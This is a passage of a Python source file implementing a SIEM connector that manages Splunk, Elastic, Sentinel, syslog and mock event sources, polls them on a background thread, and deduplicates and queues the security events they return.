        with self._lock:
            if name in self._adapters:
                self._adapters[name].disconnect()
                del self._adapters[name]
                logger.info(f"Removed SIEM source: {name}")
                return True
        return False

    def connect_all(self) -> Dict[str, bool]:
        """Connect all configured sources."""
        results = {}
        with self._lock:
            for name, adapter in self._adapters.items():
                try:
                    results[name] = adapter.connect()
                except Exception as e:
                    logger.error(f"Failed to connect {name}: {e}")
                    results[name] = False
        return results

    def disconnect_all(self) -> None:
        """Disconnect all sources."""
        with self._lock:
            for name, adapter in self._adapters.items():
                try:
                    adapter.disconnect()
                except Exception as e:
                    logger.error(f"Error disconnecting {name}: {e}")

    def start_polling(self, interval: int = 60) -> None:
        """
        Start polling SIEM sources for events.

        Args:
            interval: Poll interval in seconds
        """
        if self._running:
            logger.warning("SIEM polling already running")
            return

        self._running = True
        self._poll_thread = threading.Thread(
            target=self._poll_loop,
            args=(interval,),
            daemon=True,
            name="SIEMPoller",
        )
        self._poll_thread.start()
        logger.info(f"SIEM polling started (interval: {interval}s)")

    def stop_polling(self) -> None:
        """Stop polling SIEM sources."""
        self._running = False
        if self._poll_thread:
            self._poll_thread.join(timeout=5.0)
            self._poll_thread = None
        logger.info("SIEM polling stopped")

    def get_events(
        self,
        max_events: int = 100,
        blocking: bool = False,
        timeout: float = 1.0,
    ) -> List[SIEMEvent]:
        """
        Get queued events.

        Args:
            max_events: Maximum events to return
            blocking: Wait for events if queue empty
            timeout: Timeout for blocking wait

        Returns:
            List of SIEM events
        """
        events = []
        for _ in range(max_events):
            try:
                event = self._event_queue.get(block=blocking, timeout=timeout)
                events.append(event)
                blocking = False  # Only block on first
            except queue.Empty:
                break
        return events

    def fetch_immediate(
        self,
        lookback_minutes: int = 15,
        filters: Optional[Dict[str, Any]] = None,
    ) -> List[SIEMEvent]:
        """
        Fetch events immediately from all sources.

        Args:
            lookback_minutes: How far back to look
            filters: Event filters

        Returns:
            List of events
        """
        events = []
        since = datetime.now() - timedelta(minutes=lookback_minutes)

        with self._lock:
            for name, adapter in self._adapters.items():
                if adapter.is_connected():
                    try:
                        source_events = adapter.fetch_events(since, filters)
                        for event in source_events:
                            event.metadata["siem_source"] = name
                            events.append(event)
                    except Exception as e:
                        logger.error(f"Error fetching from {name}: {e}")
                        self._stats["errors"] += 1

        # Deduplicate
        unique_events = self._deduplicate(events)
        self._stats["events_received"] += len(unique_events)

        return unique_events

    def get_stats(self) -> Dict[str, Any]:
        """Get connector statistics."""
        with self._lock:
            connected = sum(1 for a in self._adapters.values() if a.is_connected())
            return {
                **self._stats,
                "sources_total": len(self._adapters),
                "sources_connected": connected,
                "queue_size": self._event_queue.qsize(),
                "is_polling": self._running,
            }

    def _create_adapter(self, config: SIEMConfig) -> Optional[SIEMAdapter]:
        """Create appropriate adapter for config."""
        adapters = {
            SIEMProvider.MOCK: MockSIEMAdapter,
            SIEMProvider.SPLUNK: SplunkAdapter,
            SIEMProvider.ELASTIC: ElasticAdapter,
            SIEMProvider.SENTINEL: SentinelAdapter,
            SIEMProvider.SYSLOG: SyslogAdapter,
        }

        adapter_class = adapters.get(config.provider)
        if adapter_class:
            return adapter_class(config)

        logger.warning(f"No adapter for provider: {config.provider}")
        return None

    def _poll_loop(self, interval: int) -> None:
        """Main polling loop."""
        while self._running:
            try:
                self._stats["poll_cycles"] += 1
                events = self.fetch_immediate()

                for event in events:
                    self._event_queue.put(event)
                    if self.on_event:
                        try:
                            self.on_event(event)
                        except Exception as e:
                            logger.error(f"Event callback error: {e}")

            except Exception as e:
                logger.error(f"Poll cycle error: {e}")
                self._stats["errors"] += 1

            time.sleep(interval)

    def _deduplicate(self, events: List[SIEMEvent]) -> List[SIEMEvent]:
        """Deduplicate events based on event_id."""
        unique = []
        for event in events:
            if event.event_id not in self._seen_events:
                self._seen_events.add(event.event_id)
                unique.append(event)
            else:
                self._stats["events_deduplicated"] += 1

        # Limit seen events set size
        if len(self._seen_events) > 10000:
            # Keep only the most recent half
            self._seen_events = set(list(self._seen_events)[-5000:])

        return unique


def create_siem_connector(
    on_event: Optional[Callable[[SIEMEvent], None]] = None,
    add_mock_source: bool = False,
) -> SIEMConnector:
    """
    Factory function to create a SIEM connector.

    Args:
        on_event: Callback for new events
        add_mock_source: Add a mock source for testing

    Returns:
        Configured SIEMConnector
    """
    connector = SIEMConnector(on_event=on_event)

    if add_mock_source:
        mock_config = SIEMConfig(
            provider=SIEMProvider.MOCK,
            poll_interval=10,
        )
        connector.add_source("mock", mock_config)
        connector.connect_all()

    return connector
